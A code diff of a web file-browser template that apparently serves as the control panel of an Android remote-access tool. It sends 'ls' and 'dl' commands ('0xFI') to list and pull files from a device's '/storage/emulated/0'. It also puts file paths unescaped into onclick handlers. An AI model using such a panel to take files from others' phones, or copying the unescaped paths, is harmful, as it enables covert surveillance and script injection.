@@ -1,127 +1,93 @@
 <div class="ui segment">
     <div class="ui secondary menu">
         <div class="right menu">
-            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop"> 
-                <i class="icon home"></i>Home
-            </button>
+            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop"> <i
+                    class="icon home"></i>Home</button>
+            <!-- Home = /storage/emulated/0 -->
         </div>
     </div>
     <table class="ui celled table">
         <thead>
             <tr>
-                <th style="text-align: center" colspan="3">Files</th>
+                <th style="text-align: center" colspan="2">Files</th>
             </tr>
         </thead>
-        <tbody id="fileTableBody">
+        <tbody>
+            <% pageData.forEach((item) => { %>
+            <tr>
+                <td title="<%= item.path %>"><%= item.name %></td>
+                <td class="collapsing">
+                    <% if(!item.isDir) { %>
+                    <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
+                            class="icon download blue"></i></button>
+                    <% } else { %>
+                    <button class="ui button dlop"
+                        onclick="openDirectory(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
+                            class="icon folder open grey"></i></button>
+                    <% } %>
+                </td>
+            </tr>
+            <% }) %>
         </tbody>
     </table>
 
     <script>
-        // وظيفة لفتح الدليل وعرض محتوياته
+
         function openDirectory(element, path) {
-            toggleButtonState(element, true);
-            fetch(`/api/files?path=${encodeURIComponent(path)}`)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.error) {
-                        showNotification('#f03434', data.error);
-                    } else {
-                        updateFileTable(data.files);
+            $(element).children().css("opacity", "0");
+            $(element).addClass('blue');
+            $(element).addClass('loading');
+            $('.dlop').addClass('disabled');
+            sendCommand('0xFI', {
+                action: 'ls',
+                path
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('blue');
+                        $('.dlop').removeClass('loading')
+                    }, 300)
+                } else {
+                    if (message === 'Requested') {
+                        showNotification('#2ecc71', 'Requesting Files, Please Wait');
+                        setTimeout(() => {
+                            location.reload();
+                        }, 500)
                     }
-                })
-                .catch(error => {
-                    showNotification('#f03434', error.message);
-                })
-                .finally(() => {
-                    toggleButtonState(element, false);
-                });
+                }
+            })
         }
 
-        // وظيفة لتنزيل ملف
         function downloadFile(element, path) {
-            toggleButtonState(element, true);
-            fetch(`/api/download?path=${encodeURIComponent(path)}`)
-                .then(response => {
-                    if (!response.ok) throw new Error('Download failed');
-                    showNotification('#2ecc71', 'Downloading File...');
-                })
-                .catch(error => {
-                    showNotification('#f03434', error.message);
-                })
-                .finally(() => {
-                    toggleButtonState(element, false);
-                });
-        }
-
-        // وظيفة لحذف ملف
-        function deleteFile(element, path) {
-            const confirmation = confirm("هل أنت متأكد أنك تريد حذف هذا الملف؟");
-            if (!confirmation) return;
-
-            toggleButtonState(element, true);
-            fetch(`/api/delete`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ path })
+            $(element).children().css("opacity", "0");
+            $(element).addClass('green');
+            $(element).addClass('loading');
+            $('.dlop').addClass('disabled');
+            sendCommand('0xFI', {
+                action: 'dl',
+                path
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error)
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('green');
+                        $('.dlop').removeClass('disabled')
+                    }, 300)
+                } else {
+                    if (message === 'Requested') {
+                        setTimeout(() => {
+                            $(element).children().css("opacity", "1");
+                            $(element).removeClass('green');
+                            $(element).removeClass('loading');
+                            $('.dlop').removeClass('disabled')
+                            showNotification('#2ecc71', 'Downloading File, It will be avaliable in `Downloads` Soon');
+                        }, 300)
+                    }
+                }
             })
-            .then(response => {
-                if (!response.ok) throw new Error('Delete failed');
-                $(element).closest('tr').remove(); // إزالة الصف من الجدول
-                showNotification('#2ecc71', 'تم حذف الملف بنجاح.');
-            })
-            .catch(error => {
-                showNotification('#f03434', error.message);
-            })
-            .finally(() => {
-                toggleButtonState(element, false);
-            });
-        }
-
-        // وظيفة لتحديث جدول الملفات بالبيانات الجديدة
-        function updateFileTable(files) {
-            const tbody = $('#fileTableBody');
-            tbody.empty(); // مسح الإدخالات الحالية
-            files.forEach(file => {
-                const row = `<tr>
-                    <td title="${file.path}">${file.name}</td>
-                    <td class="collapsing">
-                        ${file.isDir ? 
-                            `<button class="ui button dlop" onclick="openDirectory(this, '${file.path}')">
-                                <i class="icon folder open grey"></i>
-                            </button>` :
-                            `<button class="ui button dlop" onclick="downloadFile(this, '${file.path}')">
-                                <i class="icon download blue"></i>
-                            </button>
-                            <button class="ui button red" onclick="deleteFile(this, '${file.path}')">
-                                <i class="icon trash"></i>
-                            </button>`
-                        }
-                    </td>
-                </tr>`;
-                tbody.append(row);
-            });
-        }
-
-        // وظيفة لإظهار الإشعارات
-        function showNotification(color, message) {
-            console.log(`%c${message}`, `color: ${color}`);
-            // تنفيذ منطق الإشعار الفعلي هنا (مثل استخدام إشعار أو نافذة منبثقة)
-        }
-
-        // وظيفة لتبديل حالة الزر
-        function toggleButtonState(element, isLoading) {
-            const $element = $(element);
-            if (isLoading) {
-                $element.children().css("opacity", "0");
-                $element.addClass('loading');
-                $('.dlop').addClass('disabled');
-            } else {
-                $element.children().css("opacity", "1");
-                $element.removeClass('loading');
-                $('.dlop').removeClass('disabled');
-            }
         }
     </script>
 </div>
